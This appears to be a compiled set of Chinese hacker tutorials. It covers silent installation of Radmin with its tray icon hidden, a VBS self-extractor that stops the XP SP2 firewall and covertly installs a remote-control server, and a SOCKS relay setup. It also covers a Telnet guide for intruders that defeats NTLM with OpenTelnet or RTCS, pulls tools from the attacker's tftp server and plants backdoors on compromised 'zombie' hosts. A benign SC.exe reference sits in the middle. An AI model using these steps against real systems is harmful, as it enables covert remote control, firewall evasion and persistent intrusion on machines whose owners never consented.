psfile \\远程机器ip 33 -c 或 psfile \\远程机器ip c:\winnt -c



【QQ代理服务器的安装和设置命令】
[命令行的安装]
安装服务: 运行 SkSockServer.exe -install
删除服务: SkSockServer.exe -remove
启动服务: net start skserver
停止服务: net stop skserver

SkSockServerV1.03后增加的直接运行,不需要安装的新功能:
命令行输入: SkSockServer -Debug [新的端口]
运行结果: 程序不停止,这时,该机器就在 [新的端口] 进行 sock5代理服务了,还可以作为其他代理跳板的中间跳板.:) 

SkSockServerV1.06后增加命令行的配置功能。
由命令行设置/显示 当前 端口,启动方式,允许的客户ip连接,远程跳板设置.
c:> SkSockServer -config show === [显示所有配置]
c:> SkSockServer -config port === [显示/设置 端口]
c:> SkSockServer -config StartType === [显示/设置 服务启动方式]
c:> SkSockServer -config client [add/del] === [显示/增加/删除 客户端的项目]
c:> SkSockServer -config SkServer [add/del] === [显示/增加/删除 经过SkServer的项目]


[命令行的删除]
首先: net stop skserver
删除服务: SkSockServer.exe -remove





【Radmin服务器图标隐藏注册表修改位置】
国外优秀远程控制软件Radmin服务器图标隐藏与显示的注册表位置是:
HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters

DisableTrayIcon
00 00 00 00 

98与XP下一样.



@echo off
@net stop r_server
@r_server.exe /uninstall /silence
@r_server.exe /install /silence
@r_server.exe /pass:22445566 /port:8116 /save /silence
@net start r_server


@echo off
@net stop r_server
@r_server.exe /pass:107042016 /port:1070 /save /silence
@net start r_server

【radmin自解压之穿透XP SP2防火墙】
打造radmin自解压之穿透XP SP2防火墙 

--------------------------------------------------------------------------------
 
摘自:  2005-12-28 09:09:26  军团论坛 
 
文章作者：HACKER007

Radmin这款远程管理软件得到很多人的青睐，它速度很快。这个是其优点之一，还要数它的优点就是要数它不给杀病毒软件所杀。关于radmin的优点我就不多说了。
　　在网上我看到很多关于制作radmin自解压的文章.方法当然很多，有的是运行了后出现一个黑漆漆的ｃｍｄ.有的是提示错误的。等等。需然是可以达到给目标主机安装到目的。但是这样我怕就算是电脑大傻瓜都会知道了是什么回事吧。还有一点就是假如碰到
　　ｘｐ　ｓｐ2的系统的呢？我问下你们，给你们安装到了，你难道就可以连得过去吗？
　　众所周知　ｓｐ２的系统默认是打开_blank">防火墙的。当你运行了系统会弹出对话框询问你是不是要解除r_server的阻止，你想下人家会给你解除阻止吗？
　　　　我们说下打造的步骤吧，先在自己的电脑安装radmin，设置好radmin的密码和端口等等的信息。


安装好radmin和设置好参数后，我们现在打开注册表把RAdmin的配置信息从注册表导来。
注册表的\HKEY_LOCAL_MACHINE\SYSTEM\RADmin\

命名为radmin.reg
我们先要把服务的类型改为禁用。在运行那输入services.msc打开服务。找到Windows Firewall/Internet Connection Sharing (ICS)这个服务，把类型设置为禁用：


做到这一步后，我们打开控制面版－打开_blank">防火墙。例外－添加端口。因为我刚才设置的ｒａｄｍｉｎ的端口是1983，所以就填入1983。

我们要把windowsｘｐｓｐ２的_blank">防火墙服务的注册表导出来。位置是在
\HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sharedAccess\
命名为sharedaccess.reg
最后我们新建一个一个文本文件， (当然用ｖｂｓ的拉，要不是用ｂａｔ就弹出黑漆漆的ｃｍｄ) 在文本文件输入以下内容
set ws=wscript.createobject("wscript.shell")
ws.run "net stop sharedaccess",0
ws.run "regedit.exe /s shardaccess.reg",0
ws.run "regedit.exe /s radmin.reg",0
ws.run "r_server.exe /install /silence",0
ws.run "r_server.exe /start",0
最后就是把他改成load.vbs
把刚才的RAdmin.reg sharedaccess.reg load.vbs 和ｒａｄｍｉｎ的3个服务端r_server.exe　 raddrv.dll　 AdmDll.dll　六个文件做成一个自解压的文件就ｏｋ了

如果大家有更好的配置方法请跟我联系，当然有不足之处，请大家包含。。。。。。。



 


【SC的使用详解】
我们知道在MStools SDK，也就是在Resource Kit有一个很少有人知道的命令行软件，SC.exe，这个软件向所有的Windows NT和Windows 2000要求控制他们的API函数。我们可以在命令行里通过对这些函数设定参数的方式来设定他们(API)。SC.exe也可以显示服务的状态，同时也可以从状态结构区域里重新找到存储在里面的数值。它还可以列出远程计算机的服务函数或者是服务状况结构。SC.exe这个开发工具至少可以比服务控制面板程序和网络命令行界面(net.exe，这个东西可以告诉你一个服务是 
在运行中，还是停止，还是暂停。）这两个东西提供更多的细节和准确的信息。虽然上述两个东西在正常工作的情况下，对于完整的调试是非常好用的，但是如果有新的服务，或者新的代码被开发出来的时候，这两个工具提供的信息可能造成误导。这也就是我们需要用到SC的原因。 

下面举列说明，如果在开发阶段，你的服务在挂住在一个start-pending的时候，控制面板和net.exe同样报告服务是在运行的。但它挂在一个stop-pending的时候，net.exe报告它运行，而控制面板着报告它停止，如果你试着 启动它，这是控制面板则会告诉你这个服务正在运行。难道这不是很困惑吗？呵呵！ 
SC.exe可以让你询问服务的状况和取出存储在状态结构区域内的数值，控制面板和net.exe不提供服务完整的状况 。但是无论如何，SC程序可以告诉你这个服务准确的情形，同样也可以给你看最后的checkpoint数和等待提示。 
这个checkpoint，我叫它检查点(我觉得他就像一个程序调试时置的断点)，所以我们也可以把看作为一个调试工具，因为它可以提供一个关于在程序停止时还要沿着初始化继续前进多久准确报告。 
SC.exe也可以允许你调用很多的服务控制API函数，可以让你从命令行里改变大量的参数。这位服务开发者们提供了很多的优势。例如，它提供了一个方便的方式来创建或者在注册表和服务控制管理数据库中配置服务信息。开发者们不需要在手动的在注册表里单独的设置键值来配置服务，也不用重起机器来强迫服务控制管理数据库升级 。 
作为一个命令很工具，SC.exe可以用来测试你自己的系统，你可以设置一个批处理文件来使用不同的参数调用SC.exe来控制服务。这个很有用，如果你想看看你的服务不断的启动和停止，我没有试过哦！让一个服务一下子 
打开，一下子关闭，听上去很不错的。如果你的服务进程里面有多个进程的话，你可以保持一个进程继续运行不 
让它走开，然后让另一个不断的打开在关闭，还可以寻找一下内存缺乏导致不完全清楚的证据。 
下面介绍SC，SC QC，and SC QUERY 

SC使用这样的语法： 
1. SC [Servername] command Servicename [Optionname= Optionvalue] 

2. SC [command] 

这里使用第一种语法使用SC，使用第二种语法显示帮助。 

下面介绍各种参数。 

Servername 
可选择：可以使用双斜线，如\\myserver，也可以是\\192.168.0.1来*作远程计算机。如果在本地计算机上 

*作 
就不用添加任何参数。 

Command 
下面列出SC可以使用的命令。 

config 改变一个服务的配置。（长久的） 

continue 对一个服务送出一个继续控制的要求。 

control 对一个服务送出一个控制。 

create 创建一个服务。（增加到注册表中） 

delete 删除一个服务。（从注册表中删除） 

EnumDepend 列举服务的从属关系。 

GetDisplayName 获得一个服务的显示名称。 

GetKeyName 获得一个服务的服务键名。 

interrogate 对一个服务送出一个询问控制要求。 

pause 对一个服务送出一个暂停控制要求。 

qc 询问一个服务的配置。 

query 询问一个服务的状态，也可以列举服务的状态类型。 

start 启动一个服务。 

stop 对一个服务送出一个停止的要求。 

Servicename 
在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务 

控 
制面板看到），而SC是使用服务键名来鉴别服务的。 

Optionname 
这个optionname和optionvalue参数允许你指定*作命令参数的名称和数值。注意，这一点很重要在*作名称 

和等 
号之间是没有空格的。一开始我不知道，结果………………，比如，start= optionvalue，这个很重要。 
optionvalue可以是0，1，或者是更多的*作参数名称和数值对。 
如果你想要看每个命令的可以用的optionvalue，你可以使用sc command这样的格式。这会为你提供详细的帮 

助。 

Optionvalue 
为optionname的参数的名称指定它的数值。有效数值范围常常限制于哪一个参数的optionname。如果要列表请 

用 
sc command来询问每个命令。 

Comments 
很多的命令需要管理员权限，所以我想说，在你*作这些东西的时候最好是管理员。呵呵！ 

当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以 

得 
到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 
但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 

当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。 

SC create 
这个命令可以在注册表和服务控制管理数据库建立一个入口。 

语法1 
sc [servername] create Servicename [Optionname= Optionvalue] 

这里的servername，servicename，optionname，optionvalue和上面的一样，这里就不多说了。这里我们 

详细说 
明一下optionname和optionvalue。 

Optionname Optionvalue 
描述 

type= own, share, interact, kernel, filesys 
关于建立服务的类型，选项值包括驱动程序使用的类型，默认是share。 

start= boot, system, auto, demand, disabled 
关于启动服务的类型，选项值包括驱动程序使用的类型，默认是demand（手动）。 

error= normal, severe, critical, ignore 
当服务在导入失败错误的严重性，默认是normal。 

binPath= (string) 
服务二进制文件的路径名，这里没有默认值，这个字符串是必须设置的。 

group= (string) 
这个服务属于的组，这个组的列表保存在注册表中的ServiceGroupOrder下。默认是nothing。 

tag= (string) 
如果这个字符串被设置为yes，sc可以从CreateService call中得到一个tagId。然而，SC并不显示这个标签 

，所 
以使用这个没有多少意义。默认是nothing 

depend= (space separated string)有空格的字符串。 
在这个服务启动前必须启动的服务的名称或者是组。 

obj= (string) 
账号运行使用的名称，也可以说是登陆身份。默认是localsystem 

Displayname= (string) 
一个为在用户界面程序中鉴别各个服务使用的字符串。 

password= (string) 
一个密码，如果一个不同于localsystem的账号使用时需要使用这个。 

Optionvalue 
Optionname参数名称的数值列表。参考optionname。当我们输入一个字符串时，如果输入一个空的引用这意味 

着 
一个空的字符串将被导入。 

Comments 
The SC CREATE command performs the operations of the CreateService API function. 
这个sc create命令执行CreateService API函数的*作。详细请见CreateService。 

例1 
下面这个例子在一台叫做（\\myserver）的计算机上为一个叫“NewService”的服务建立的一个注册表登记。 
sc \\myserver create NewService binpath= c:\winnt\system32\NewServ.exe 

按照默认，这个服务会建立一个WIN32_SHARE_PROCESS使用SERVICE_DEMAND_START启动方式。这将不会有任 

何从属 
关系，也将会按照localsystem安全上下关系来运行。 

例2 
下面这个例子将在本地计算机上，建立一个服务，它将会是一个自动运行服务，并且运行在他自己的进程上。它 
从属于TDI组和NetBios服务上。注意，你必须在从属中间增加一个空格的引用。 

sc create NewService binpath= c:\winnt\system32\NewServ.exe type= own 
start= auto depend= "+TDI Netbios" 

例3 
服务开发者可以通过临时改变二进制路径（影像路径）的方式来将这个服务运行在内核调试器的上下关系中。下 
面这个例子就可以让我们看到如何改变服务的配置。 

sc config NewService binpath= "ntsd -d c:\winnt\system32\Newserv.exe" 
这个例子会引起服务控制管理器调用ntsd.exe使用下例的参数字符串： 
"-d c:\nt\system32\NewServ.exe" 

当系统装入newserv.exe时ntsd将会转而打断调试器，所以断点可以被设置在服务代码里。 

SC QC 
这个SC QC“询问配置”命令可以列出一个服务的配置信息和QUERY_SERVICE_CONFIG结构。 

语法1 
sc [Servername] qc Servicename [Buffersize] 

Parameters 
servername和servicename前面已经介绍过了，这里不再多说。 

Buffersize，可选择的，列出缓冲区的尺寸。 

Comments 

SC QC命令显示了QUERY_SERVICE_CONFIG结构的内容。 

以下是QUERY_SERVICE_CONFIG相应的区域。 
TYPE dwServiceType 
START_TYPE dwStartType 
ERROR_CONTROL dwErrorControl 
BINARY_PATH_NAME lpBinaryPathName 
LOAD_ORDER_GROUP lpLoadOrderGroup 
TAG dwTagId 
DISPLAY_NAME lpDisplayName 
DEPENDENCIES lpDependencies 
SERVICE_START_NAME lpServiceStartName 

例1 

下面这个例子询问了在上面例子中建立的“NewService”服务的配置： 

sc \\myserver qc NewService 

sc显示下面的信息： 

SERVICE_NAME: NewService 
TYPE : 20 WIN32_SHARE_PROCESS 
START_TYPE : 3 DEMAND_START 
ERROR_CONTROL : 1 NORMAL 
BINARY_PATH_NAME : c:\winnt\system32\NewServ.exe 
LOAD_ORDER_GROUP : 
TAG : 0 
DISPLAY_NAME : NewService 
DEPENDENCIES : 
SERVICE_START_NAME : LocalSystem 

NewService有能力和其他的服务共享一个进程。但是它不是自动启动的。二进制文件名是NewServ.exe。这个 

服务 
不依靠与其它的的服务，而且运行在lcoalsystem的安全上下关系中。这些都是调用QueryServiceStatus基 

本的返 
回，如果还需要更多的细节届时，可以看看API函数文件。 

SC QUERY 

SC QUERY命令可以获得服务的信息。 

语法： 
sc [Servername] query { Servicename │ Optionname= Optionvalue... } 

参数： 

servername, servicename, optionname, optionvalue不在解释。只谈一下这个命令提供的数值。 

Optionname Optionvalue 
Description 

type= driver, service, all 
列举服务的类型，默认是service 

state= active, inactive, all 
列举服务的状态，默认是active 

bufsize= (numeric value) 
列举缓冲区的尺寸，默认是1024 bytes 

ri= (numeric value) 
但开始列举时，恢复指针的数字，默认是0 

Optionvalue 
同上。 

Comments 

SC QUERY命令可以显示SERVICE_STATUS结构的内容。 

下面是SERVICE_STATUS结构相应的信息： 
TYPE dwServiceType 
STATE dwCurrentState, dwControlsAccepted 
WIN32_EXIT_CODE dwWin32ExitCode 
SERVICE_EXIT_CODE dwServiceSpecificExitCode 
CHECKPOINT dwCheckPoint 
WAIT_HINT dwWaitHint


【SQL下无法加用户的原因】
对方已经把安全策略（本地密码策略）加上去了：第一、密码必须8位；第二、密码必须符合安全性要求
如果你再cmd下面，那么几乎没有希望了
如果可以进入界面，你可以输入secpol.msc本地安全策略，把他们关闭就可以增加用户了。


【telnet协议】
目录：

一 摘要
二 远程登录
三 Telnet协议
四 Win2000的Telnet服务
五 在telnet中该做什么
六 结束语


一 摘要

Telnet的应用不仅方便了我们进行远程登录，也给hacker们提供了又一种入侵手段和后门，但无论如何，在你尽情享受Telnet所带给你的便捷的同时，你是否真正的了解Telnet呢？


二 远程登录


Telnet服务虽然也属于客户机/服务器模型的服务，但它更大的意义在于实现了基于Telnet协议的远程登录（远程交互式计算），那么就让我们来认识一下远程登录。


1 远程登陆的基本概念


先来看看什么叫登录：分时系统允许多个用户同时使用一台计算机，为了保证系统的安全和记帐方便，系统要求每个用户有单独的帐号作为登录标识，系统还为每个用户指定了一个口令。用户在使用该系统之前要输入标识和口令，这个过程被称为'登录'。

远程登陆是指用户使用Telnet命令，使自己的计算机暂时成为远程主机的一个仿真终端的过程。仿真终端等效于一个非智能的机器，它只负责把用户输入的每个字符传递给主机，再将主机输出的每个信息回显在屏幕上。


2 远程登陆的产生及发展


我们可以先构想一个提供远程文字编辑的服务，这个服务的实现需要一个接受编辑文件请求和数据的服务器以及一个发送此请求的客户机。客户机将建立一个从本地机到服务器的TCP连接，当然这需要服务器的应答，然后向服务器发送键入的信息（文件编辑信息），并读取从服务器返回的输出。以上便是一个标准而普通的客户机/服务器模型的服务。

似乎有了客户机/服务器模型的服务，一切远程问题都可以解决了。然而实际并非你想象的那样简单，如果我们仅需要远程编辑文件，那么刚才所构想的服务完全可以胜任，但假如我们的要求并不是这么简单，我们还想实现远程用户管理，远程数据录入，远程系统维护，想实现一切可以在远程主机上实现的操作，那么我们将需要大量专用的服务器程序并为每一个可计算服务都使用一个服务器进程，随之而来的问题是：远程机器会很快对服务器进程应接不暇，并淹没在进程的海洋里（我们在这里排除最专业化的远程机器）。

那么有没有办法解决呢？当然有，我们可以用远程登录来解决这一切。我们允许用户在远地机器上建立一个登录会话，然后通过执行命令来实现更一般的服务，就像在本地操作一样。这样，我们便可以访问远地系统上所有可用的命令，并且系统设计员不需提供多个专用地服务器程序。

问题发展到这里好像前途一片光明了，用远程登录总应该解决问题了吧，但要实现远程登陆并不简单。不考虑网络设计的计算机系统期望用户只从直接相连的键盘和显示器上登录，在这种机器上增加远程登陆功能需要修改机器的操作系统，这是极其艰巨也是我们尽量避免的。因此我们应该集中力量构造远程登陆服务器软件，虽然这样也是比较困难的。为什么说这样做也比较困难呢？

举个例子来说：一般，操作系统会为一些特殊按键分配特殊的含义，比如本地系统将'Ctrl+C'解释为：'终止当前运行的命令进程'。但假设我们已经运行了远程登陆服务器软件，'Ctrl+C'也有可能无法被传送到远地机器，如果客户机真的将'Ctrl+C'传到了远地机器，那么'Ctrl+C'这个命令有可能不能终止本地的进程，也就是说在这里很可能会产生混乱。而且这仅仅是遇到的难题之一。

但尽管有技术上的困难，系统编程人员还是设法构造了能够应用于大多数操作系统的远程登陆服务器软件，并构造了充当客户机的应用软件。通常，客户机软件取消了除一个键以外的所有键的本地解释，并将这些本地解释相应的转换成远地解释，这就使得客户机软件与远地机器的交互，就如同坐在远程主机面前一样，从而避免了上述所提到的混乱。而那个唯一例外的键，可以使用户回到本地环境。

将远程登陆服务器设计为应用级软件，还有另一个要求，那就是需要操作系统提供对伪终端（pseudo terminal）的支持。我们用伪终端描述操作系统的入口点，它允许像Telnet服务器一样的程序向操作系统传送字符，并且使得字符像是来自本地键盘一样。只有使用这样的操作系统，才能将远程登陆服务器设计为应用级软件（比如Telnet服务器软件），否则，本地操作系统和远地系统传送将不能识别从对方传送过来的信息（因为它们仅能识别从本地键盘所键入的信息），远程登陆将宣告失败。

将远程登陆服务器设计为应用级软件虽然有其显著的优点：比将代码嵌入操作系统更易修改和控制服务器。但其也有效率不高的缺点（后面的内容将会给予解释），好在用户键入信息的速率不高，这种设计还是可以接受的。


3 远程登录的工作过程


使用Telnet协议进行远程登陆时需要满足以下条件：在本的计算机上必须装有包含Telnet协议的客户程序；必须知道远程主机的Ip地址或域名；必须知道登录标识与口令。

Telnet远程登录服务分为以下4个过程：

1）本地与远程主机建立连接。该过程实际上是建立一个TCP连接，用户必须知道远程主机的Ip地址或域名；

2）将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT（Net Virtual Terminal）格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据报；

3）将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果；

4）最后，本地终端对远程主机进行撤消连接。该过程是撤销一个TCP连接。


上面的内容只是讨论了远程登陆最基本的东西，其中的复杂和编程人员的艰辛是我们难以想象的，不知道你在舒服的使用Telnet的同时，是否想到了这些！


三 Telnet协议


我们知道Telnet服务器软件是我们最常用的远程登录服务器软件，是一种典型的客户机/服务器模型的服务，它应用Telnet协议来工作。那么，什么是Telnet协议？它都具备哪些特点呢？


1 基本内容


Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议。应用Telnet协议能够把本地用户所使用的计算机变成远程主机系统的一个终端。它提供了三种基本服务：

1）Telnet定义一个网络虚拟终端为远的系统提供一个标准接口。客户机程序不必详细了解远的系统，他们只需构造使用标准接口的程序；

2）Telnet包括一个允许客户机和服务器协商选项的机制，而且它还提供一组标准选项；

3）Telnet对称处理连接的两端，即Telnet不强迫客户机从键盘输入，也不强迫客户机在屏幕上显示输出。


2 适应异构


为了使多个操作系统间的Telnet交互操作成为可能，就必须详细了解异构计算机和操作系统。比如，一些操作系统需要每行文本用ASCII回车控制符（CR）结束，另一些系统则需要使用ASCII换行符（LF），还有一些系统需要用两个字符的序列回车-换行（CR-LF）；再比如，大多数操作系统为用户提供了一个中断程序运行的快捷键，但这个快捷键在各个系统中有可能不同（一些系统使用CTRL+C，而另一些系统使用ESCAPE）。如果不考虑系统间的异构性，那么在本地发出的字符或命令，传送到远地并被远地系统解释后很可能会不准确或者出现错误。因此，Telnet协议必须解决这个问题。

为了适应异构环境，Telnet协议定义了数据和命令在Internet上的传输方式，此定义被称作网络虚拟终端NVT（Net Virtual Terminal）。它的应用过程如下：

对于发送的数据：客户机软件把来自用户终端的按键和命令序列转换为NVT格式，并发送到服务器，服务器软件将收到的数据和命令，从NVT格式转换为远地系统需要的格式；
对于返回的数据：远地服务器将数据从远地机器的格式转换为NVT格式，而本地客户机将将接收到的NVT格式数据再转换为本地的格式。
对于NVT格式的详细定义，有兴趣的朋友可以去查找相关资料。


3 传送远地命令


我们知道绝大多数操作系统都提供各种快捷键来实现相应的控制命令，当用户在本地终端键入这些快捷键的时候，本地系统将执行相应的控制命令，而不把这些快捷键作为输入。那么对于Telnet来说，它是用什么来实现控制命令的远地传送呢？

Telnet同样使用NVT来定义如何从客户机将控制功能传送到服务器。我们知道USASCII字符集包括95个可打印字符和33个控制码。当用户从本地键入普通字符时，NVT将按照其原始含义传送；当用户键入快捷键（组合键）时，NVT将把它转化为特殊的ASCII字符在网络上传送，并在其到达远地机器后转化为相应的控制命令。将正常ASCII字符集与控制命令区分主要有两个原因：

1）这种区分意味着Telnet具有更大的灵活性：它可在客户机与服务器间传送所有可能的ASCII字符以及所有控制功能；

2）这种区分使得客户机可以无二义性的指定信令，而不会产生控制功能与普通字符的混乱。


4 数据流向


上面我们提到过将Telnet设计为应用级软件有一个缺点，那就是：效率不高。这是为什么呢？下面给出Telnet中的数据流向： 

数据信息被用户从本地键盘键入并通过操作系统传到客户机程序，客户机程序将其处理后返回操作系统，并由操作系统经过网络传送到远地机器，远地操作系统将所接收数据传给服务器程序，并经服务器程序再次处理后返回到操作系统上的伪终端入口点，最后，远地操作系统将数据传送到用户正在运行的应用程序，这便是一次完整的输入过程；输出将按照同一通路从服务器传送到客户机。

因为每一次的输入和输出，计算机将切换进程环境好几次，这个开销是很昂贵的。还好用户的键入速率并不算高，这个缺点我们仍然能够接受。


5 强制命令


我们应该考虑到这样一种情况：假设本地用户运行了远地机器的一个无休止循环的错误命令或程序，且此命令或程序已经停止读取输入，那么操作系统的缓冲区可能因此而被占满，如果这样，远地服务器也无法再将数据写入伪终端，并且最终导致停止从TCP连接读取数据，TCP连接的缓冲区最终也会被占满，从而导致阻止数据流流入此连接。如果以上事情真的发生了，那么本地用户将失去对远地机器的控制。

为了解决此问题，Telnet协议必须使用外带信令以便强制服务器读取一个控制命令。我们知道TCP用紧急数据机制实现外带数据信令，那么Telnet只要再附加一个被称为数据标记(date mark)的保留八位组，并通过让TCP发送已设置紧急数据比特的报文段通知服务器便可以了，携带紧急数据的报文段将绕过流量控制直接到达服务器。作为对紧急信令的相应，服务器将读取并抛弃所有数据，直到找到了一个数据标记。服务器在遇到了数据标记后将返回正常的处理过程。 


6 选项协商


由于Telnet两端的机器和操作系统的异构性，使得Telnet不可能也不应该严格规定每一个telnet连接的详细配置，否则将大大影响Telnet的适应异构性。因此，Telnet采用选项协商机制来解决这一问题。

Telnet选项的范围很广：一些选项扩充了大方向的功能，而一些选项制涉及一些微小细节。例如：有一个选项可以控制Telnet是在半双工还是全双工模式下工作（大方向）；还有一个选项允许远地机器上的服务器决定用户终端类型（小细节）。

Telnet选项的协商方式也很有意思，它对于每个选项的处理都是对称的，即任何一端都可以发出协商申请；任何一端都可以接受或拒绝这个申请。另外，如果一端试图协商另一端不了解的选项，接受请求的一端可简单的拒绝协商。因此，有可能将更新，更复杂的Telnet客户机服务器版本与较老的，不太复杂的版本进行交互操作。如果客户机和服务器都理解新的选项，可能会对交互有所改善。否则，它们将一起转到效率较低但可工作的方式下运行。所有的这些设计，都是为了增强适应异构性，可见Telnet的适应异构性对其的应用和发展是多么重要。

上面讨论了一些原理方面的东西，虽然我们在Telnet的使用过程中很难接触到这一层面，但我认为了解这些是有意义的，它会给我们带来许多启示。下面让我们来看看Win2000的Telnet服务。


（本系列教程不定期更新，欲获得最新版本，请登陆官方网站：菜菜鸟社区 http://ccbirds.yeah.net）


四 Win2000的Telnet服务

其实从应用层面上，Win2000的Telnet服务并没有什么可说的，绝大部分内容你都可以从HELP文件中得到，我在此只是把它稍微整理一下而已。


1 基本配置


Win2000为我们提供了Telnet客户机和服务器程序：Telnet.exe是客户机程序（Client），tlntsvr.exe是服务器程序（server），同时它还为我们提供了Telnet服务器管理程序tlntadmn.exe。

Windows 2000 默认安装了 Telnet 服务，但是并没有默认启动。下面给出HELP文件中 Telnet 服务的一部分默认设置：

AllowTrustedDomain：是否允许域用户访问。默认值是1，允许信任域用户访问。可以改为0: 不允许域用户访问（只允许本地用户）。

DefaultDomain：可以对与该计算机具有信任关系的任何域设置。默认值是"."。

DefaultShell：显示 shell 安装的路径位置。默认值是： %systemroot%\System32\Cmd.exe /q /k 

MaxFailedLogins：在连接终止之前显示尝试登录失败的最大次数。默认是3。

LoginScript：显示 Telnet 服务器登录脚本的路径位置。默认的位置就是“%systemroot%\System32\login.cmd”，你可以更改脚本内容，这样登录进Telnet的欢迎屏幕就不一样了。

NTLM：NTLM身份验证选项。默认是2。可以有下面这些值：
0: 不使用 NTLM 身份验证。
1: 先尝试 NTLM 身份验证，如果失败，再使用用户名和密码。
2: 只使用 NTLM 身份验证。

TelnetPort：显示 telnet 服务器侦听 telnet 请求的端口。默认是：23。你也可以更改为其他端口。

以上各项设置你可以使用tlntadmn.exe（Telnet服务器管理程序）来进行非常方便的配置，配置后需要重新启动Telnet服务。如图1


2 NTLM


提到了telnet就不能不提NTLM，我想这也是让入侵者最为头痛的一件事，哪怕你获得了管理员帐号和密码，想简单通过NTLM也并非易事，况且win2000中的telnet默认仅以NTLM方式验证身份，这就让我们不得不关注NTLM这个东东，那么什么是NTLM呢？

早期的SMB协议在网络上明文传输口令，后来出现了"LAN Manager Challenge/Response"验证机制，简称LM，它十分简单以至很容易被破解，微软随后提出了WindowsNT挑战/响应验证机制，即NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。NTLM工作流程是这样的：

1、客户端首先在本地加密当前用户的密码成为密码散列
2、客户端向服务器发送自己的帐号，这个帐号是没有经过加密的，明文直接传输
3、服务器产生一个16位的随机数字发送给客户端，作为一个 challenge（挑战） 
4、客户端再用加密后的密码散列来加密这个 challenge ，然后把这个返回给服务器。作为 response（响应） 
5、服务器把用户名、给客户端的challenge 、客户端返回的 response 这三个东西，发送域控制器
6、域控制器用这个用户名在 SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 challenge。
7、域控制器比较两次加密的 challenge ，如果一样，那么认证成功。

从上面的过程我们可以看出，NTLM是以当前用户的身份向Telnet服务器发送登录请求的，而不是用你扫到的对方管理员的帐户和密码登录，显然，你的登录将会失败。举个例子来说，你家的机器名为A（本地机器），你入侵的机器名为B（远地机器），你在A上的帐户是xinxin，密码是1234，你扫到B的管理员帐号是Administrator，密码是5678，当你想Telnet到B时，NTLM将自动以当前用户的帐号和密码作为登录的凭据来进行上面的7项操作，即用xinxin和1234，而并非用你扫到的Administrator和5678，且这些都是自动完成的，根本不给你插手的机会，因此你的登录操作将失败。

由于Telnet服务器对NTLM的使用有3个选项，所以当你Telnet远地机器时，会显示下面情况中的一种：

1)身份验证选项=0时
=====================================
Microsoft (R) Windows (TM) Version 5.00 (Build 2195)
Welcome to Microsoft Telnet Service
Telnet Server Build 5.00.99201.1
login:
password:

\\为0时不使用NTML身份验证，直接输入用户名和密码，比如你可以输入扫到的Administrator和5678


2)身份验证选项=1时
=====================================
NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password
Microsoft (R) Windows (TM) Version 5.00 (Build 2195)
Welcome to Microsoft Telnet Service
Telnet Server Build 5.00.99201.1
login:
password:

\\先尝试 NTLM 身份验证，如果失败，再使用用户名和密码，其实这种方式对于我们来说，与上一种方式没什么区别


3)身份验证选项=2时 
=====================================
NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password
Server allows NTLM authentication only
Server has closed connection
遗失对主机的连接。
C:\>

\\仔细看看上面的显示，根本没有给你输入用户名和密码的机会，直接断开连接，扫到了密码也是白扫

所以对于入侵者来说，NTLM是横在我们面前的一座大山，必须要除掉它，一般我们有如下几种方法：

1通过修改远程注册表更改telnet服务器配置，将验证方式从2改为1或0；
2使用NTLM.exe，上传后直接运行，可将telnet服务器验证方式从2改为1；
3在本地建立扫描到的用户，以此用户身份开启telnet客户机并进行远程登录；
4使用软件，比如opentelnet.exe（需要管理员权限且开启IPC管道）
5使用脚本，如RTCS，（需要管理员权限但不依赖IPC管道）

基本上是以上的5种，其中后两种是我们比较常用的开telnet的手法，而且使用方法十分简单，命令如下：

OpenTelnet.exe \\server username password NTLMAuthor telnetport
OpenTelnet.exe \\服务器地址 管理员用户名 密码 验证方式（填0或1） telnet端口

cscript RTCS.vbe targetIP username password NTLMAuthor telnetport
cscript RTCS.vbe <目标IP> <管理员用户名> <密码> <验证方式> <tlnet端口>


五 在telnet中该做什么


本来写到上面就想结束了，不过许多朋友都说telnet上去后不知道该做什么了，既然这样，那我就抛砖引玉吧，这次不讲具体做法，只是说说思路，什么？为什么不讲具体做法？篇幅不够嘛，以后我会一一解释的。


1 查看系统信息


呵呵，其实就是随处看看，看看他的系统配置和版本（用type c:\boot.ini来知道pro版或server版），看看都装了什么服务或软件（从目录名就可以知道了），看看有什么重要或有趣的文件啦（唉，要是国外的机器，看也看不懂），看看他的用户情况，总之就是尽可能多的了解系统，为一会装后门摸底。


2 使用tftp传送文件


想必大家都遇到过在telnet中传输文件的问题，因为我们习惯了在ipc管道中的文件传输，所以有些朋友喜欢用net share ipc$ 来打开管道，进而利用copy来传输文件。不过这样反而麻烦，既然我们已经得到了shell，我们可以用TFPT命令来完成这一切，什么是TFTP呢？


用TFTP(Trivial File Transfer Protocol)来实现文件的传送是一种基于UDP连接的文件传输，一般是使用Windows自带的tftp.exe和一个TFTP服务器端软件构成一个完整的传输结构。它是这样使用的： 首先运行本地的TFTP Server（比如tftpd32.exe）软件并保证始终开启直至传输全部完成， 然后在telnet中（当然你也可以在其他shell中）运行下面的命令： 
C:\>tftp Ci ip get xinxin.exe c:\abc\xinxin.exe
其中ip为你自己机器的ip，且上传文件要与TFTP服务器端在同一目录下，这样你就可以把xinxin.exe上传到c盘abc目录下了（其实是从tftp服务器下载来的）

需要指出的是，如果使用代理IP，你将不能实现与外部网络的文件传送。因为你的代理网关在进行数据封装的时候会将自己的IP地址加入到你的数据报中，代替你的内部网络地址，所以在外部网络进行MAC寻址时是找不到你这台TFTP服务器的。 


3 安置后门


安置后门放在第二步好像早了点，如果你入侵还有其他目的，比如以破坏为主，或者是来修改主页的，那么这些事情当然可以在安置后门之前做；如果你只是想得到一只肉鸡，那就没什么可说的了，安后门吧。

